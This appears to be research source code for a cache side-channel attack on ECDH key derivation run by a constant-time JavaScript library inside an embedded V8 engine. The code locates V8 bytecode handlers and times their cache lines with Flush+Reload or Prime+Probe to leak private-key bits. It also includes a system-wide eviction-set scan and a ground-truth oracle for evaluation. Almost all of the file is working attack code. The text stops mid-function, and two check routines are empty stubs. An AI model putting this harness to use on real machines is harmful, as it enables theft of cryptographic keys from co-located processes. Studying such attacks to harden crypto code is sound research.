#include <pthread.h>
#include <sched.h>
#include <unistd.h>

#include <atomic>
#include <cctype>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <memory>

#include "v8_runtime.h"

extern "C" {
#include "arch.h"
#include "cache.h"
#include "config.h"
#include "flush_reload.h"
#include "fs.h"
#include "log.h"
#include "prime_probe.h"
#include "shared_memory.h"
}

enum { cache_line_count = 2, profile_iterations = 1 << 16 };

static const uint64_t max_exec_cycles = (uint64_t)5e10;

static const uint64_t pp_max_exec_cycles = (uint64_t)1e8;

static int victim_runs = 20;

static const char *test_name = "v8_ctjs_ecdh";

static const char *source_str = nullptr;
static const char *repeat_str = nullptr;
static const char *key_path = nullptr;

static uint64_t sample_tsc_arr[cache_line_count][profile_iterations];
static uint64_t reload_time_arr[cache_line_count][profile_iterations];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *reload_time[cache_line_count];
static uint64_t **const probe_time = reload_time;

enum { H_NEGATE = 0, H_BITAND, H_BITXOR, handler_count };

struct handler_info {
	const char *name;
	uintptr_t addr;
	size_t len;
};

static handler_info handlers[handler_count] = {
	{ "NegateHandler", 0, 0 },
	{ "BitwiseAndHandler", 0, 0 },
	{ "BitwiseXorHandler", 0, 0 },
};

struct target_builtin_line {
	int handler;
	uint64_t off;
	char role;
};

static target_builtin_line target_lines[cache_line_count] = {
	{ H_BITAND, 0x080, '0' },
	{ H_NEGATE, 0x000, 'c' },
};

static int check_bitand(uint64_t *p, uint32_t n) {

	return 0;
}

static int check_negate(uint64_t *p, uint32_t n) {

	return 0;
}

static bool parse_target_line(int cl, const char *spec) {
	if (cl < 0 || cl >= cache_line_count) {
		log_error("-cl%d: only %d channels exist", cl, cache_line_count);
		return false;
	}
	char buf[128];
	snprintf(buf, sizeof(buf), "%s", spec);

	char *off_tok = strchr(buf, ':');
	if (!off_tok) {
		log_error("-cl%d=%s: expected <handler>:<off>[:<role>]", cl, spec);
		return false;
	}
	*off_tok++ = '\0';
	char *role_tok = strchr(off_tok, ':');
	if (role_tok) {
		*role_tok++ = '\0';
	}

	int found = -1;
	for (int h = 0; h < handler_count; ++h) {
		char base[64];
		snprintf(base, sizeof(base), "%s", handlers[h].name);
		char *suffix = strstr(base, "Handler");
		if (suffix) {
			*suffix = '\0';
		}
		if (strcasestr(base, buf)) {
			if (found >= 0) {
				log_error(
				    "-cl%d=%s: '%s' matches several handlers", cl, spec, buf);
				return false;
			}
			found = h;
		}
	}
	if (found < 0) {
		log_error("-cl%d=%s: no handler matching '%s'", cl, spec, buf);
		return false;
	}

	char *end = nullptr;
	uint64_t off = strtoull(off_tok, &end, 0);
	if (end == off_tok || *end != '\0') {
		log_error("-cl%d=%s: bad offset '%s'", cl, spec, off_tok);
		return false;
	}

	char role = target_lines[cl].role;
	if (role_tok) {
		if (strlen(role_tok) != 1 || !strchr("01c", role_tok[0])) {
			log_error("-cl%d=%s: role must be one of 0, 1, c", cl, spec);
			return false;
		}
		role = role_tok[0];
	}

	target_lines[cl].handler = found;
	target_lines[cl].off = off;
	target_lines[cl].role = role;
	return true;
}

static FR_attacker_thread_config_t fr_lines[cache_line_count];

static uint64_t fr_wait_cycles = 2000;

static i64 fr_hit_thresh = 260;

enum prim_t { PRIM_FR = 0, PRIM_PP };
static prim_t prim = PRIM_FR;
static const char *prim_name(void) {
	return prim == PRIM_FR ? "fr" : "pp";
}

static bool use_csi = false;

static std::atomic<bool> g_csi_oracle{ false };

enum { csi_key_count = 3 };
static const char *csi_probe_keys[csi_key_count] = {
	"experiments/v8_constant_time_js/ec_key_zeros.hex",
	"experiments/v8_constant_time_js/ec_key_ones.hex",
	"experiments/v8_constant_time_js/ec_key_alt.hex",
};

static int warmup_runs = 5;

static bool name_is(const v8::JitCodeEvent *event, const char *base) {
	const char *s = event->name.str;
	size_t len = event->name.len;
	for (size_t i = 0; i < len; ++i) {
		if (s[i] == ':') {
			s += i + 1;
			len -= i + 1;
			break;
		}
	}
	size_t blen = strlen(base);
	return len == blen && memcmp(s, base, blen) == 0;
}

static void jit_event_handler(const v8::JitCodeEvent *event) {
	if (event->type != v8::JitCodeEvent::CODE_ADDED) {
		return;
	}
	if (event->code_type != v8::JitCodeEvent::JIT_CODE) {
		return;
	}
	for (int h = 0; h < handler_count; ++h) {
		if (name_is(event, handlers[h].name)) {
			handlers[h].addr = reinterpret_cast<uintptr_t>(event->code_start);
			handlers[h].len = event->code_len;
			return;
		}
	}
}

static void init_target_lines(void) {
	for (int cl = 0; cl < cache_line_count; ++cl) {
		const target_builtin_line &b = target_lines[cl];
		FR_thread_config_init(fr_lines[cl]);
		fr_lines[cl].label = handlers[b.handler].name;
		fr_lines[cl].slot = cl;
		fr_lines[cl].target = (uint8_t *)(handlers[b.handler].addr + b.off);
	}
}

static void log_channels(const char *prim) {
	for (int cl = 0; cl < cache_line_count; ++cl) {
		log_info("cl%d role '%c'  %s +0x%03lx  (%s, %p)",
		         cl,
		         target_lines[cl].role,
		         fr_lines[cl].label,
		         target_lines[cl].off,
		         prim,
		         (void *)fr_lines[cl].target);
	}
}

static void write_channel_metadata(void) {
	char dir[256], path[512];
	snprintf(dir, sizeof(dir), "output/%s_r%05d", test_name, victim_runs);
	create_directory(dir);
	snprintf(path, sizeof(path), "%s/channels", dir);

	FILE *fp = fopen(path, "w");
	if (!fp) {
		log_error("could not write channel metadata to %s", path);
		return;
	}
	fprintf(fp, "# col role handler off primitive\n");
	for (int cl = 0; cl < cache_line_count; ++cl) {
		fprintf(fp,
		        "%d %c %s 0x%lx %s\n",
		        cl,
		        target_lines[cl].role,
		        fr_lines[cl].label,
		        target_lines[cl].off,
		        prim_name());
	}
	fclose(fp);
	log_info("channel metadata -> %s", path);
}

static const char *format_counts(char *buf, size_t n, const uint32_t *idx) {
	size_t at = 0;
	for (int cl = 0; cl < cache_line_count && at < n; ++cl) {
		int w =
		    snprintf(buf + at, n - at, "%scl%d %u", cl ? " " : "", cl, idx[cl]);
		if (w < 0) {
			break;
		}
		at += (size_t)w < n - at ? (size_t)w : n - at;
	}
	return buf;
}

static const uint32_t clock_hit_ceiling = 1000;
static uint32_t clock_hit_violations = 0;

static int find_clock_cl(void) {
	for (int cl = 0; cl < cache_line_count; ++cl) {
		if (target_lines[cl].role == 'c') {
			return cl;
		}
	}
	return -1;
}

static void check_clock_hits(uint32_t n, int run_num) {
	if (n > clock_hit_ceiling) {
		++clock_hit_violations;
		log_error("run %d: clock channel hit count %u exceeds %u -- evset "
		          "may have gone bad for this run",
		          run_num,
		          n,
		          clock_hit_ceiling);
	}
}

static void report_clock_hit_violations(void) {
	if (clock_hit_violations > 0) {
		log_error("%u/%d captured run(s) exceeded the clock hit ceiling -- "
		          "check those traces before trusting the decode",
		          clock_hit_violations,
		          victim_runs);
	}
}

static bool has_suffix(const char *s, const char *suffix) {
	size_t sl = strlen(s);
	size_t fl = strlen(suffix);
	return sl >= fl && strcmp(s + sl - fl, suffix) == 0;
}

static const char *js_quote(const char *s, char *buf, size_t n) {
	size_t at = 0;
	buf[at++] = '\'';
	for (; *s && at + 3 < n; ++s) {
		if (*s == '\'' || *s == '\\') {
			buf[at++] = '\\';
		}
		buf[at++] = *s;
	}
	buf[at++] = '\'';
	buf[at] = '\0';
	return buf;
}

static void clear_samples(const uint32_t *idx) {
	for (int cl = 0; cl < cache_line_count; ++cl) {
		size_t n = idx[cl] < profile_iterations ? idx[cl] : profile_iterations;
		memset(
		    sample_tsc[cl], 0, profile_iterations * sizeof(sample_tsc[cl][0]));
		memset(reload_time[cl],
		       0,
		       profile_iterations * sizeof(reload_time[cl][0]));
	}
}

static void *v8_attacker_thread_fr(void *arg) {
	(void)arg;
	log_channels("FR");
	i64 threshold = fr_hit_thresh;
	const int clock_cl = find_clock_cl();

	for (int r = 0; r < victim_runs; ++r) {
		uint32_t idx[cache_line_count] = { 0 };
		for (int cl = 0; cl < cache_line_count; ++cl) {
			clflush((volatile void *)fr_lines[cl].target);
		}

		pthread_barrier_wait(sync_ctx.barrier);
		u64 t0 = rdtscp(), t1 = t0;
		bool full = false;
		do {
			FR_wait(fr_wait_cycles);
			for (int cl = 0; cl < cache_line_count; ++cl) {
				u64 access_time = timed_access((void *)fr_lines[cl].target);
				if ((i64)access_time <= threshold &&
				    idx[cl] < profile_iterations) {
					sample_tsc[cl][idx[cl]] = rdtscp();
					reload_time[cl][idx[cl]] = access_time;
					++idx[cl];
					if (idx[cl] == profile_iterations) {
						full = true;
					}
				}
				clflush((volatile void *)fr_lines[cl].target);
			}
			t1 = rdtscp();
		} while (!full && sync_ctx_get_action() == SYNC_CTX_START &&
		         (t1 - t0) < max_exec_cycles);

		pthread_barrier_wait(sync_ctx.barrier);

		char counts[256];
		log_info("run %d/%d: window %lu cyc, hits %s",
		         r + 1,
		         victim_runs,
		         t1 - t0,
		         format_counts(counts, sizeof(counts), idx));
		dump_profiling_traces(test_name,
		                      victim_runs,
		                      sample_tsc,
		                      probe_time,
		                      cache_line_count,
		                      profile_iterations,
		                      r == 0);
		check_clock_hits(idx[clock_cl], r + 1);
		clear_samples(idx);
	}
	report_clock_hit_violations();
	return nullptr;
}

static pthread_barrier_t attacker_threads_barrier;
static PP_attacker_thread_config_t pp_cfg[cache_line_count];
static uint32_t ps_run_idx[cache_line_count];

static void *v8_attacker_thread_pp(void *arg) {
	PP_attacker_thread_config_t *cfg = (PP_attacker_thread_config_t *)arg;
	const int cl = cfg->slot;
	const bool lead = (cl == 0);
	EVSet *const evset = cfg->evset;
	const int threshold = cfg->threshold;
	const int clock_cl = find_clock_cl();

	if (lead) {
		log_channels("PP");
	}
	log_info("Parallel Prime+Probe %s threshold: %d", cfg->label, threshold);

	for (int r = 0; r < victim_runs; ++r) {
		PP_profile_once(evset,
		                cl,
		                cfg->label,
		                threshold,
		                profile_iterations,
		                pp_max_exec_cycles,
		                sample_tsc,
		                probe_time);

		uint32_t index = 0;
		for (int i = 0; i < profile_iterations; ++i) {
			if (sample_tsc[cl][i] != 0) {
				++index;
			}
		}
		ps_run_idx[cl] = index;
		pthread_barrier_wait(&attacker_threads_barrier);

		if (lead) {
			char counts[256];
			log_info("run %d/%d: evictions %s",
			         r + 1,
			         victim_runs,
			         format_counts(counts, sizeof(counts), ps_run_idx));
			dump_profiling_traces(test_name,
			                      victim_runs,
			                      sample_tsc,
			                      probe_time,
			                      cache_line_count,
			                      profile_iterations,
			                      r == 0);
			check_clock_hits(ps_run_idx[clock_cl], r + 1);

			clear_samples(ps_run_idx);
		}

		pthread_barrier_wait(&attacker_threads_barrier);
	}
	if (lead) {
		report_clock_hit_violations();
	}
	return nullptr;
}

enum { victim_bits_max = 1 << 8 };
static int64_t vb_ts[victim_bits_max];
static uint8_t vb_bit[victim_bits_max];
static char vb_out[victim_bits_max * 24];

static char g_vb_csi[victim_bits_max * 24];
static std::atomic<size_t> g_vb_csi_len{ 0 };

static const char victim_ground_truth[] =
    "(() => { return [gt_ts, gt_bit, gt_n]; })()";

static size_t format_victim_ground_truth(v8::Isolate *isolate,
                                         v8::Local<v8::Context> context,
                                         v8::Local<v8::Script> grab_script,
                                         char *buf,
                                         size_t bufsz) {
	v8::HandleScope handle_scope(isolate);
	v8::Local<v8::Value> got;
	if (!grab_script->Run(context).ToLocal(&got) || !got->IsArray()) {
		return 0;
	}
	v8::Local<v8::Object> triple = got.As<v8::Object>();
	v8::Local<v8::Value> ts_v, bit_v, len_v;
	if (!triple->Get(context, 0).ToLocal(&ts_v) ||
	    !triple->Get(context, 1).ToLocal(&bit_v) ||
	    !triple->Get(context, 2).ToLocal(&len_v)) {
		return 0;
	}
	if (!ts_v->IsBigInt64Array() || !bit_v->IsUint8Array()) {
		return 0;
	}
	uint32_t n = len_v->Uint32Value(context).FromMaybe(0);
	if (n == 0) {
		return 0;
	}
	if (n > victim_bits_max) {
		log_error("victim oracle: %u pairs in one run, keeping %d",
		          n,
		          victim_bits_max);
		n = victim_bits_max;
	}
	ts_v.As<v8::ArrayBufferView>()->CopyContents(vb_ts, n * sizeof(vb_ts[0]));
	bit_v.As<v8::ArrayBufferView>()->CopyContents(vb_bit,
	                                              n * sizeof(vb_bit[0]));

	size_t at = 0;
	for (uint32_t j = 0; j < n; ++j) {
		int w = snprintf(buf + at,
		                 bufsz - at,
		                 "%lld,%u\n",
		                 (long long)vb_ts[j],
		                 (unsigned)vb_bit[j]);
		if (w < 0 || (size_t)w >= bufsz - at) {
			break;
		}
		at += (size_t)w;
	}
	return at;
}

static void grab_victim_ground_truth(v8::Isolate *isolate,
                                     v8::Local<v8::Context> context,
                                     v8::Local<v8::Script> grab_script) {
	size_t at = format_victim_ground_truth(
	    isolate, context, grab_script, vb_out, sizeof(vb_out));
	if (at == 0) {
		return;
	}

	char dir[256], path[512];
	snprintf(dir, sizeof(dir), "output/%s_r%05d", test_name, victim_runs);
	create_directory(dir);
	snprintf(path, sizeof(path), "%s/victim_bits.txt", dir);

	static FILE *fp = nullptr;
	if (fp == nullptr) {
		fp = fopen(path, "w");
	}
	if (fp == nullptr) {
		log_error("could not write ground truth to %s", path);
		return;
	}
	fwrite(vb_out, 1, at, fp);
	fflush(fp);
}

void print_helper(int argc, char *argv[]) {
	(void)argc;
	log_error(
	    "Usage: %s [options] <source.js> <repeat.js> <key_path>\n"
	    "  <key_path>           ec_key_<i>.json pool entry ({key1,key2}, "
	    "sets both parties)\n"
	    "                       or a raw-hex scalar file (sets party 1 "
	    "only)\n"
	    "  -fr                  FLUSH+RELOAD (default): flush and time the "
	    "target line\n"
	    "                       itself, no eviction set\n"
	    "  -pp                  PRIME+PROBE: time a traversal of the whole "
	    "evset, which\n"
	    "                       measures and re-primes in one pass\n"
	    "  -csi                 blind system-wide evset scan: keep only sets "
	    "matching the\n"
	    "                       target line's page offset and dump every "
	    "candidate's traces.\n"
	    "                       The three paths are optional under -csi -- they "
	    "default to\n"
	    "                       the canonical js/ and ec_key_zeros.hex under the "
	    "project root\n"
	    "  -cl<i>=<h>:<off>[:<role>]  retarget channel i, e.g. "
	    "-cl0=and:0x0c0:0\n"
	    "                       (<h> = any substring of a handler name: "
	    "neg, and, xor)\n"
	    "  -wait=<cyc>          F+R inter-poll delay (default %lu)\n"
	    "  -thresh=<cyc>        F+R hit threshold (default %ld)\n"
	    "  -runs=<n>            profiled derive() calls (default %d)\n"
	    "  -warmup=<n>          unprofiled derive() calls first (default %d)\n"
	    "\n"
	    "The victim's own per-bit (tsc, bit) ground truth is NOT a flag here: "
	    "it is on\n"
	    "whenever the <source.js> handed to us has `let debug = 1;`, which is "
	    "what\n"
	    "run_ecdh_ct.sh's BITS=1 generates. See evaluation/run_ecdh_ct.sh.\n"
	    "\n"
	    "V8 flags go AFTER all three paths.",
	    argv[0],
	    (unsigned long)fr_wait_cycles,
	    (long)fr_hit_thresh,
	    victim_runs,
	    warmup_runs);
}

static bool v8_set_key(v8::Isolate *isolate,
                       v8::Local<v8::Context> context,
                       const char *path) {
	char key_script[4096];
	char key_path_js[2048];
	js_quote(path, key_path_js, sizeof(key_path_js));
	if (has_suffix(path, ".json")) {
		snprintf(key_script,
		         sizeof(key_script),
		         "(() => { let kp = JSON.parse(read(%s)); "
		         "s1 = ec.keyFromPrivate(kp.key1, 'hex'); "
		         "s2 = ec.keyFromPrivate(kp.key2, 'hex'); "
		         "s1_pub = s1.getPublic(); s2_pub = s2.getPublic(); "
		         "return kp.key1; })()",
		         key_path_js);
	} else {

		snprintf(key_script,
		         sizeof(key_script),
		         "(() => { let k = read(%s).trim(); "
		         "s1 = ec.keyFromPrivate(k, 'hex'); "
		         "s1_pub = s1.getPublic(); "
		         "return k; })()",
		         key_path_js);
	}
	v8::Local<v8::String> key_src =
	    v8::String::NewFromUtf8(isolate, key_script).ToLocalChecked();
	v8::Local<v8::Script> key_compiled;
	v8::Local<v8::Value> key_result;
	bool ok = v8::Script::Compile(context, key_src).ToLocal(&key_compiled) &&
	          key_compiled->Run(context).ToLocal(&key_result) &&
	          key_result->IsString();
	if (ok) {
		v8::String::Utf8Value key_hex(isolate, key_result);
		log_info("attack key %s (hex): %s", path, *key_hex);
	} else {
		log_error("failed to set s1 from key file %s", path);
	}
	return ok;
}

static void v8_victim_run(v8::Isolate *isolate) {
	v8::Isolate::Scope iscope(isolate);
	v8::HandleScope scope(isolate);
	v8::TryCatch try_catch(isolate);

	isolate->SetJitCodeEventHandler(
	    static_cast<v8::JitCodeEventOptions>(v8::kJitCodeEventDefault |
	                                         v8::kJitCodeEventEnumExisting),
	    jit_event_handler);
	isolate->SetJitCodeEventHandler(v8::kJitCodeEventDefault, nullptr);

	v8::Local<v8::ObjectTemplate> global = v8::ObjectTemplate::New(isolate);
	global->Set(isolate, "rdtscp", v8::FunctionTemplate::New(isolate, Rdtscp));
	global->Set(isolate, "read", v8::FunctionTemplate::New(isolate, Read));
	global->Set(
	    isolate, "readbuffer", v8::FunctionTemplate::New(isolate, ReadBuffer));
	global->Set(isolate, "print", v8::FunctionTemplate::New(isolate, Print));
	v8::Local<v8::Context> context = v8::Context::New(isolate, nullptr, global);
	v8::Context::Scope cscope(context);

	log_info("V8 runtime load source (classic script)");

	v8::Local<v8::String> source =
	    v8::String::NewFromUtf8(isolate, source_str).ToLocalChecked();
	v8::Local<v8::Script> source_script;
	bool source_ok =
	    v8::Script::Compile(context, source).ToLocal(&source_script) &&
	    !source_script->Run(context).IsEmpty();

	bool key_ok = source_ok && v8_set_key(isolate, context, key_path);

	v8::Local<v8::Script> repeat_script;
	v8::Local<v8::Value> repeat_result;
	bool repeat_ok = false;
	if (key_ok) {
		v8::Local<v8::String> repeat_src =
		    v8::String::NewFromUtf8(isolate, repeat_str).ToLocalChecked();
		repeat_ok =
		    v8::Script::Compile(context, repeat_src).ToLocal(&repeat_script) &&
		    repeat_script->Run(context).ToLocal(&repeat_result) &&
		    repeat_result->IsFunction();
	}
	if (!source_ok) {
		ReportException(isolate, &try_catch);
		log_error("failed to load source script");
		return;
	} else if (!key_ok) {
		return;
	} else if (!repeat_ok) {
		ReportException(isolate, &try_catch);
		log_error("repeat script must evaluate to a function");
		return;
	}
	v8::Local<v8::Function> repeat_func = repeat_result.As<v8::Function>();

	for (int h = 0; h < handler_count; ++h) {
		log_info(LOG_BOLD_ON "%-30s %p (%zu bytes)" LOG_BOLD_OFF,
		         handlers[h].name,
		         (void *)handlers[h].addr,
		         handlers[h].len);
	}

	for (int i = 0; i < warmup_runs; ++i) {
		(void)repeat_func->Call(context, context->Global(), 0, nullptr);
	}
	log_info("warmup done (%d unprofiled derives)", warmup_runs);

	v8::Local<v8::Script> grab_script =
	    v8::Script::Compile(context,
	                        v8::String::NewFromUtf8(isolate,
	                                                victim_ground_truth)
	                            .ToLocalChecked())
	        .ToLocalChecked();

	bool oracle_on = false;
	{
		v8::Local<v8::String> dbg_src = v8::String::NewFromUtf8Literal(
		    isolate, "(typeof debug !== 'undefined' && !!debug)");
		v8::Local<v8::Value> dbg_val;
		if (v8::Script::Compile(context, dbg_src)
		        .ToLocalChecked()
		        ->Run(context)
		        .ToLocal(&dbg_val)) {
			oracle_on = dbg_val->BooleanValue(isolate);
		}
	}
	if (oracle_on) {
		log_info("victim oracle ON (debug=1 in the loaded source): its own "
		         "(tsc,bit) pairs are drained after each profiled run into "
		         "output/%s_r%05d/victim_bits.txt",
		         test_name,
		         victim_runs);
	}

	if (use_csi) {
		g_csi_oracle.store(oracle_on, std::memory_order_relaxed);
		if (oracle_on) {
			log_info("CSI ground truth ON: true target set + per-(set,key) "
			         "oracle drained into output/%s/{csi_truth,victim_bits}.txt",
			         test_name);
		}
	}

	log_info("victim ready to start");

	if (use_csi) {
		for (;;) {
			pthread_barrier_wait(sync_ctx.barrier);
			sync_ctx_action_t act = sync_ctx_get_action();
			if (act == SYNC_CTX_EXIT) {
				break;
			}
			if (act == SYNC_CTX_SET_KEY) {
				if (!v8_set_key(
				        isolate, context, (const char *)sync_ctx.data)) {
					log_error("CSI: failed to load probe key %s",
					          (const char *)sync_ctx.data);
				}
			} else if (act == SYNC_CTX_START) {
				(void)repeat_func->Call(context, context->Global(), 0, nullptr);

				sync_ctx_set_action(SYNC_CTX_PAUSE);

				if (oracle_on) {
					g_vb_csi_len.store(
					    format_victim_ground_truth(
					        isolate, context, grab_script, g_vb_csi,
					        sizeof(g_vb_csi)),
					    std::memory_order_relaxed);
				}
			}
			pthread_barrier_wait(sync_ctx.barrier);
		}
		log_info("victim CSI loop done (EXIT)");
		return;
	}

	for (int r = 0; r < victim_runs; ++r) {
		sync_ctx_set_action(SYNC_CTX_START);
		pthread_barrier_wait(sync_ctx.barrier);
		(void)repeat_func->Call(context, context->Global(), 0, nullptr);
		sync_ctx_set_action(SYNC_CTX_PAUSE);

		u64 gc_t0 = rdtscp();
		isolate->RequestGarbageCollectionForTesting(
		    v8::Isolate::kFullGarbageCollection);
		if (r == 0) {

			log_info("per-run full GC between window close and barrier B: "
			         "%lu cyc (--expose-gc)",
			         (unsigned long)(rdtscp() - gc_t0));
		}

		pthread_barrier_wait(sync_ctx.barrier);

		if (oracle_on) {
			grab_victim_ground_truth(isolate, context, grab_script);
		}
	}
}

void *v8_victim_thread(void *) {

	v8::V8::SetFlagsFromString(
	    "--allow-natives-syntax --no-sparkplug --always-turbofan "
	    "--single-threaded --expose-gc --min-semi-space-size=16");
	std::unique_ptr<v8::Platform> platform = v8::platform::NewDefaultPlatform();
	v8::V8::InitializePlatform(platform.get());
	v8::V8::Initialize();

	v8::Isolate::CreateParams create_params;
	create_params.array_buffer_allocator =
	    v8::ArrayBuffer::Allocator::NewDefaultAllocator();
	v8::Isolate *isolate = v8::Isolate::New(create_params);

	v8_victim_run(isolate);

	isolate->Dispose();
	v8::V8::Dispose();
	v8::V8::DisposePlatform();
	delete create_params.array_buffer_allocator;
	return nullptr;
}

struct csi_params_t {
	uint32_t page_slot;

	uint8_t *target;

	int true_set;
	const char *label;
	int (*check_fn)(uint64_t *, uint32_t);
};

static uint32_t v8_csi_profile_once(EVSet *evset,
                                    uint64_t profile_iters,
                                    uint64_t max_cycles,
                                    uint64_t **sample_tsc,
                                    uint64_t **probe_time) {
	uint64_t tsc0, tsc1, end, scope_lat;
	uint32_t aux, index = 0;
	uint8_t *scope = evset->addrs[0];
	evchain *sf_chain = evchain_build(evset->addrs, SF_ASSOC);
	i64 threshold = detected_cache_lats.l2_thresh;

	prime_skx_sf_evset_ps_flush(evset, sf_chain, array_repeat, l2_repeat);
	tsc0 = tsc1 = rdtscp();
	sync_ctx_set_action(SYNC_CTX_START);
	pthread_barrier_wait(sync_ctx.barrier);
	do {
		tsc1 = rdtscp();
		scope_lat = _time_maccess_aux(scope, end, aux);
		if (scope_lat > threshold) {
			if (scope_lat < detected_cache_lats.interrupt_thresh) {
				probe_time[0][index] = scope_lat;
				sample_tsc[0][index] = tsc1;
				index++;
			}
			prime_skx_sf_evset_ps_flush(evset, sf_chain, array_repeat, l2_repeat);
		}
	} while (tsc1 - tsc0 < max_cycles && index < profile_iters &&
	         sync_ctx_get_action() == SYNC_CTX_START);
	sync_ctx_set_action(SYNC_CTX_PAUSE);
	pthread_barrier_wait(sync_ctx.barrier);
	return index;
}

static void write_csi_truth(const char *label,
                            uint32_t page_slot,
                            int true_set,
                            void *va) {
	static bool first = true;
	char dir[128], path[256];
	snprintf(dir, sizeof(dir), "output/%s", test_name);
	create_directory(dir);
	snprintf(path, sizeof(path), "%s/csi_truth.txt", dir);
	FILE *fp = fopen(path, first ? "w" : "a");
	if (!fp) {
		log_error("could not write CSI truth to %s", path);
		return;
	}
	if (first) {
		fprintf(fp, "# label page_slot true_set target_va\n");
	}
	fprintf(fp, "%s %u %d %p\n", label, page_slot, true_set, va);
	fclose(fp);
	first = false;
}

static void write_csi_victim_bits(int l3_set,
                                  char gt_blk[][victim_bits_max * 24],
                                  const size_t *gt_len) {
	static bool first = true;
	char dir[128], path[256];
	snprintf(dir, sizeof(dir), "output/%s", test_name);
	create_directory(dir);
	snprintf(path, sizeof(path), "%s/victim_bits.txt", dir);
	FILE *fp = fopen(path, first ? "w" : "a");
	if (!fp) {
		log_error("could not write CSI oracle to %s", path);
		return;
	}
	for (int ki = 0; ki < csi_key_count; ++ki) {
		fprintf(fp, "# set %d col %d key %s\n", l3_set, ki, csi_probe_keys[ki]);
		if (gt_len[ki]) {
			fwrite(gt_blk[ki], 1, gt_len[ki], fp);
		}
	}
	fclose(fp);
	first = false;
}

static void identify_one_target(const csi_params_t *p,
                                uint64_t **id_sample_tsc,
                                uint64_t **id_probe_time) {
	config_t *cfg = get_config();

	const bool ground_truth = g_csi_oracle.load(std::memory_order_relaxed);
	if (ground_truth) {
		log_info("%s target set (hardcoded): %d [va %p, page slot %u]",
		         p->label,
		         p->true_set,
		         (void *)p->target,
		         p->page_slot);
		write_csi_truth(p->label, p->page_slot, p->true_set, (void *)p->target);
	}

	static char gt_blk[csi_key_count][victim_bits_max * 24];
	size_t gt_len[csi_key_count] = { 0 };

	for (int l3_set = 0; l3_set < (int)cfg->l3.sets; ++l3_set) {
		if ((uint32_t)(l3_set % NUM_PAGE_SLOTS) != p->page_slot) {
			continue;
		}

		log_debug("%s l3_set: %x", p->label, l3_set);

		EVSet *evset = get_sf_kth_evset(l3_set);
		if (!evset) {
			log_error("cannot build evset for set %d", l3_set);
			continue;
		}

		uint32_t max_cnt = 0;
		for (int ki = 0; ki < csi_key_count; ++ki) {

			snprintf((char *)sync_ctx.data,
			         sync_ctx_data_size,
			         "%s/%s",
			         cfg->project_root,
			         csi_probe_keys[ki]);
			sync_ctx_set_action(SYNC_CTX_SET_KEY);
			pthread_barrier_wait(sync_ctx.barrier);
			pthread_barrier_wait(sync_ctx.barrier);

			memset(id_sample_tsc[ki],
			       0,
			       sizeof(uint64_t) * profile_iterations);
			memset(id_probe_time[ki],
			       0,
			       sizeof(uint64_t) * profile_iterations);
			uint64_t *one_tsc[1] = { id_sample_tsc[ki] };
			uint64_t *one_probe[1] = { id_probe_time[ki] };
			v8_csi_profile_once(
			    evset, profile_iterations, pp_max_exec_cycles, one_tsc, one_probe);

			if (ground_truth) {
				gt_len[ki] = g_vb_csi_len.load(std::memory_order_relaxed);
				if (gt_len[ki] > sizeof(gt_blk[ki])) {
					gt_len[ki] = sizeof(gt_blk[ki]);
				}
				memcpy(gt_blk[ki], g_vb_csi, gt_len[ki]);
			}

			uint32_t cnt = 0;
			while (cnt < profile_iterations && id_sample_tsc[ki][cnt] != 0) {
				++cnt;
			}
			if (cnt > max_cnt) {
				max_cnt = cnt;
			}
			log_info("%s set %d(%x) key %s: %u samples",
			         p->label,
			         l3_set,
			         l3_set,
			         csi_probe_keys[ki],
			         cnt);
		}

		if (max_cnt > 256) {
			dump_profiling_trace(test_name,
			                     l3_set,
			                     id_sample_tsc,
			                     id_probe_time,
			                     csi_key_count,
			                     max_cnt);

			if (ground_truth) {
				write_csi_victim_bits(l3_set, gt_blk, gt_len);
			}
		}
	}
}

static int identify_ctjs_target_sets(void) {
	log_info("l2 thres %d, interrupt thres %d",
	         detected_cache_lats.l2_thresh,
	         detected_cache_lats.interrupt_thresh);

	helper_thread_ctrl hctrl;
	enum { llcf_max_attempts = 5 };
	bool pool_built = false;
	for (int attempt = 1; attempt <= llcf_max_attempts && !pool_built;
	     ++attempt) {
		pool_built = !LLCF_multi_evset(0, &hctrl);
		if (!pool_built) {
			log_error("failed to build system-wide evset pool (attempt %d/%d)",
			          attempt,
			          llcf_max_attempts);
		}
	}
	if (!pool_built) {

		sync_ctx_set_action(SYNC_CTX_EXIT);
		pthread_barrier_wait(sync_ctx.barrier);
		return 0;
	}

	static uint64_t id_tsc_arr[csi_key_count][profile_iterations];
	static uint64_t id_probe_arr[csi_key_count][profile_iterations];
	uint64_t *id_sample_tsc[csi_key_count];
	uint64_t *id_probe_time[csi_key_count];
	for (int ki = 0; ki < csi_key_count; ++ki) {
		id_sample_tsc[ki] = id_tsc_arr[ki];
		id_probe_time[ki] = id_probe_arr[ki];
	}

	csi_params_t targets[cache_line_count] = {
		{
		    (uint32_t)((((uintptr_t)fr_lines[0].target) & PAGE_MASK) >>
		               CACHE_LINE_BITS),
		    fr_lines[0].target,
		    -1,
		    fr_lines[0].label,
		    check_bitand,
		},
		{
		    (uint32_t)((((uintptr_t)fr_lines[1].target) & PAGE_MASK) >>
		               CACHE_LINE_BITS),
		    fr_lines[1].target,
		    -1,
		    fr_lines[1].label,
		    check_negate,
		},
	};

	for (int cl = 0; cl < cache_line_count; ++cl) {
		log_info("%s page slot %x (target %p)",
		         targets[cl].label,
		         targets[cl].page_slot,
		         (void *)fr_lines[cl].target);
	}

	config_t *cfg = get_config();
	snprintf((char *)sync_ctx.data,
	         sync_ctx_data_size,
	         "%s/%s",
	         cfg->project_root,
	         csi_probe_keys[0]);
	sync_ctx_set_action(SYNC_CTX_SET_KEY);
	pthread_barrier_wait(sync_ctx.barrier);
	pthread_barrier_wait(sync_ctx.barrier);

	for (int cl = 0; cl < cache_line_count; ++cl) {
		identify_one_target(&targets[cl], id_sample_tsc, id_probe_time);
	}

	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier);

	return 1;
}

int v8_ctjs_ecdh_attack() {

	if (cache_env_init(1)) {
		log_error("failed to initialize cache env");
		return 1;
	}

	for (int cl = 0; cl < cache_line_count; ++cl) {
		sample_tsc[cl] = sample_tsc_arr[cl];
		probe_time[cl] = reload_time_arr[cl];
	}

	init_target_lines();
	write_channel_metadata();

	if (use_csi) {
		return identify_ctjs_target_sets() ? 0 : 1;
	}

	const int attacker_count = prim == PRIM_FR ? 1 : cache_line_count;
	pthread_t attackers[cache_line_count];

	int started = 0;
